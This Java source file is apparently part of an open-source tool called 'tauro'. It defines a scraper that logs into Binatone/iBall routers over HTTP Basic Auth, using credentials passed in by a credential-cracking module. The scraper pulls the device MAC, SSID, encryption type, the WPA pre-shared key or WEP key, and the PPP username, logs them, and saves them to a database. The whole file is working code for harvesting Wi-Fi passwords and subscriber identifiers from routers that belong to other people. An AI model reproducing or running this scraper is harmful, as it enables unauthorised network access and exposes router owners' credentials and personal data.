/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package org.koreops.tauro.cli.scraper.basicauth;

import org.jsoup.HttpStatusException;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.koreops.net.def.beans.AuthCrackParams;
import org.koreops.tauro.cli.authtrial.threads.DefaultAuthTrial;
import org.koreops.tauro.cli.dao.UpdaterDao;
import org.koreops.tauro.cli.scraper.AbstractScrapperAndSaver;
import org.koreops.tauro.cli.scraper.exception.WirelessDisabledException;
import org.koreops.tauro.core.loggers.Logger;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.logging.Level;

/**
 * Scraper module for Binatone routers.
 * @author Sudipto Sarkar (k0r0pt) (sudiptosarkar@visioplanet.org).
 */
public class BinatoneScraper extends AbstractScrapperAndSaver {
  public BinatoneScraper(String host, String hostUrl, AuthCrackParams params, UpdaterDao updaterDao) {
    super(host, hostUrl, params, updaterDao);
  }

  @Override
  public boolean scrapeAndLog() {
    return this.logWirelessStation(hostUrl, base64Login);
  }

  /**
   * This is for the standard iBall modems (mostly on Airtel and BSNL).
   * <b>Matching url</b>: <i>status/status_deviceinfo.htm</i>
   *
   * @param hostUrl     The complete URL, including the port number, protocol etc
   * @param base64Login The base64 login header
   */
  private boolean logWirelessStation(String hostUrl, String base64Login) {
    try {
      String macAddr = null;
      String devInfoUrl = hostUrl + "status/status_deviceinfo.htm";

      Document doc = Jsoup.connect(devInfoUrl).userAgent(USER_AGENT).header("Authorization", "Basic " + base64Login).timeout(60000).get();

      Elements rows = doc.select("tr");

      for (Element row : rows) {
        if (row.select("td:eq(2) div font").text().trim().equalsIgnoreCase("MAC Address")) {
          macAddr = row.select("td:eq(4)").text();
          break;
        }
      }

      if (macAddr == null) {
        Logger.error(host + ": Couldn't find MAC Address!");
        return false;
      }

      Logger.debug(host + ": Found MAC: " + macAddr);

      try {
        List<Map<String, String>> wifiDataList = getWirelessData(macAddr.toLowerCase(), hostUrl, base64Login, null, null);
        if (wifiDataList == null) {
          return false;
        }

        for (Map<String, String> wifiData : wifiDataList) {
          updaterDao.saveStation(wifiData, host);
        }
      } catch (WirelessDisabledException ex) {
        Logger.error(host + ex.getMessage());
        return true;
      }

      return true;
    } catch (HttpStatusException ex) {
      if ((ex.getStatusCode() != 404) && (ex.getStatusCode() != 501)) {
        Logger.error(host + ": HttpStatusException during logWirelessStation() " + ex.getMessage() + " ::::::: " + ex.toString());
      }
    } catch (IOException ex) {
      Logger.error(host + ": IOException during logWirelessStation(): " + ex.getMessage() + " ::::::: " + ex.getLocalizedMessage());
      java.util.logging.Logger.getLogger(DefaultAuthTrial.class.getName()).log(Level.SEVERE, null, ex);
    } catch (Exception ex) {
      Logger.error(host + ": Exception during logWirelessStation(): " + ex.getMessage() + " ::::::: " + ex.getLocalizedMessage());
      java.util.logging.Logger.getLogger(DefaultAuthTrial.class.getName()).log(Level.SEVERE, null, ex);
    }

    return false;
  }

  private String getPhoneNum(String hostUrl, String base64Login) {
    String wanInfoUrl = hostUrl + "basic/home_wan.htm";
    Document doc;
    try {
      doc = Jsoup.connect(wanInfoUrl).userAgent(USER_AGENT).header("Authorization", "Basic " + base64Login).timeout(10000).get();
      Logger.info(host + ": Got WAN page.");
      for (Element element : doc.select("input[name=wan_PPPUsername]")) {
        return element.val();
      }
    } catch (HttpStatusException ex) {
      if (ex.getStatusCode() == 404) {
        Logger.error(host + ": does not have Wan " + ex.toString(), true);
      } else {
        Logger.error(host + ": HttpStatusException during getWirelessData() " + ex.getMessage() + " ::::::: " + ex.toString(), true);
      }
    } catch (IOException ex) {
      Logger.error(host + ": IOException during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString(), true);
      java.util.logging.Logger.getLogger(DefaultAuthTrial.class.getName()).log(Level.SEVERE, null, ex);
    } catch (NumberFormatException ex) {
      Logger.error(host + ": NumberFormatException during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString(), true);
      java.util.logging.Logger.getLogger(DefaultAuthTrial.class.getName()).log(Level.SEVERE, null, ex);
    } catch (Exception ex) {
      Logger.error(host + ": Exception during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString(), true);
      java.util.logging.Logger.getLogger(DefaultAuthTrial.class.getName()).log(Level.SEVERE, null, ex);
    }
    return null;
  }

  /**
   * This method scrapes the Wireless Configuration page from iBall Modems (mostly on Airtel and BSNL).
   *
   * @return A Map containing the Wifi details (BSSID, SSID, Encryption, Protocol and Key).
   */
  private List<Map<String, String>> getWirelessData(String bssid, String hostUrl, String base64Login, String index, String totalIndices)
      throws WirelessDisabledException {
    List<Map<String, String>> wifiDataList = null;
    Map<String, String> wifiData;
    boolean wifiActivated = false;
    String phoneUser = null;
    try {
      String wifiInfoUrl = hostUrl + "basic/home_wlan.htm";
      Document doc;

      if (index != null && !"".equals(index)) {
        wifiInfoUrl = hostUrl + "Forms/home_wlan_1";
        doc =
            Jsoup.connect(wifiInfoUrl).userAgent(USER_AGENT).header("Authorization", "Basic " + base64Login).data("wlanWEBFlag", "2")
                .data("WLSSIDIndex", index).data("MBSSIDSwitchFlag", totalIndices)
                .timeout(60000).post();
      } else {
        doc = Jsoup.connect(wifiInfoUrl).userAgent(USER_AGENT).header("Authorization", "Basic " + base64Login).timeout(60000).get();
        phoneUser = getPhoneNum(hostUrl, base64Login);
      }

      Elements elements = doc.select("input[name=wlan_APenable]");

      for (Element element : elements) {
        if (element.hasAttr("checked")) {
          if (element.attr("value").equalsIgnoreCase("1")) {
            wifiActivated = true;
            break;
          }
        }
      }

      if (!wifiActivated) {
        throw new WirelessDisabledException("Wireless disabled on Binatone.");
      }

      // Wifi is Activated. Let's do this!
      wifiData = new HashMap<>();
      if (phoneUser != null) {
        wifiData.put("Phone", phoneUser);
        Logger.info(host + ": Found Phone: " + wifiData.get("Phone"));
      }
      wifiData.put("BSSID", bssid.toLowerCase());
      for (Element element : doc.select("input[name=ESSID]")) {
        if (!wifiData.containsKey("SSID")) {
          wifiData.put("SSID", element.attr("value"));
          Logger.info(host + ": Found SSID: " + wifiData.get("SSID"));
          break;
        } else {
          Logger.error(host + ": Has multiple SSIDs. Modify program to handle this.");
        }
      }

      for (Element element : doc.select("select[name=WEP_Selection]")) {
        for (Element option : element.select("option")) {
          if (option.hasAttr("selected")) {
            wifiData.put("AuthType", option.text());
            Logger.info(host + ": Found AuthType: " + wifiData.get("AuthType"));
            break;
          }
        }
      }

      for (Element element : doc.select("select[name=TKIP_Selection]")) {
        for (Element option : element.select("option")) {
          if (option.hasAttr("selected")) {
            wifiData.put("Encryption", option.text());
            Logger.info(host + ": Found Encryption: " + wifiData.get("Encryption"));
            break;
          }
        }
      }

      for (Element element : doc.select("input[name=PreSharedKey]")) {
        wifiData.put("key", element.attr("value"));
        Logger.info(host + ": Found key: " + wifiData.get("key"));
      }

      if (!wifiData.containsKey("key")) {
        // The modem is configured to use WEP and not WPA.
        for (Element radio : doc.select("input[type=RADIO][name=DefWEPKey]")) {
          if (radio.hasAttr("checked")) {
            // Found our key index.
            for (Element keyVal : doc.select("input[name=WEP_Key".concat(radio.attr("value")).concat("]"))) {
              // It will be the first one.
              wifiData.put("key", keyVal.attr("value"));
              Logger.info(host + ": Found key: " + wifiData.get("key"));
            }
            break;
          }
        }
      }

      if (wifiData != null) {
        if (wifiDataList == null) {
          wifiDataList = new ArrayList<>();
        }
        wifiDataList.add(wifiData);
      }

      // TODO Figure out what needs to be posted before doing the following commented part (to fetch secondary Access Points).
      for (Element elmnt : doc.select("input[name=MBSSIDSwitchFlag]")) {
        if (Integer.valueOf(elmnt.val()) > 1) {
          Elements indices = doc.select("select[name=WLSSIDIndex] option");
          for (Element element : indices) {
            if (element.hasAttr("selected")) {
              String selectedIndex = element.text();
              //Logger.info("selected = " + selectedIndex);
              if (Integer.valueOf(selectedIndex) < indices.size()) {
                String nextIndex = Integer.toString(Integer.valueOf(selectedIndex) + 1);
                Logger.info("Multiple SSIDs detected. Log next one manually: " + nextIndex);
                if (null == totalIndices) {
                  totalIndices = elmnt.val();
                }
                //wifiDataList.addAll(this.getWirelessData(bssid, hostUrl, base64Login, nextIndex, totalIndices));
                //Logger.info("Size: " + wifiDataList.size());
              }
            }
          }
        }
      }
    } catch (HttpStatusException ex) {
      if (ex.getStatusCode() == 404) {
        Logger.error(host + ": does not have Wireless (not on the modem at least) " + ex.toString());
      } else {
        Logger.error(host + ": HttpStatusException during getWirelessData() " + ex.getMessage() + " ::::::: " + ex.toString());
      }
    } catch (IOException ex) {
      Logger.error(host + ": IOException during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
    } catch (NumberFormatException ex) {
      Logger.error(host + ": NumberFormatException during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
    } catch (Exception ex) {
      Logger.error(host + ": Exception during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
      java.util.logging.Logger.getLogger(DefaultAuthTrial.class.getName()).log(Level.SEVERE, null, ex);
    }
    if (wifiDataList != null) {
      Logger.debug("Returning list of size: " + wifiDataList.size());
    }
    return wifiDataList;
  }

}
